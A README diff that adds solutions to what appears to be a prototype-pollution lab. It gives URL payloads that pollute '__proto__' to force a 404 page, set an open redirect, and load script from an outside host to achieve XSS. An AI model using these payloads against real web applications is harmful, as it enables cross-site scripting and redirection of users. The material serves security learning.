@@ -13,3 +13,29 @@ npm install
 npm run build
 npm start
 ```
+
+## Solution
+
+<details><summary>Test - 404 page</summary><br/>
+
+```url
+/vulnerable?__proto__.notFound=1
+```
+
+</details>
+
+<details><summary>Test - redirect to google</summary><br/>
+
+```url
+/vulnerable?__proto__.redirect.destination=https://google.com
+```
+
+</details>
+
+<details><summary>XSS</summary><br/>
+    
+```url
+/vulnerable?amp=1&__proto__.amp=hybrid&__proto__.ampUrlPrefix=https://xss-callback.pwnfunction.repl.co/
+```
+
+</details>
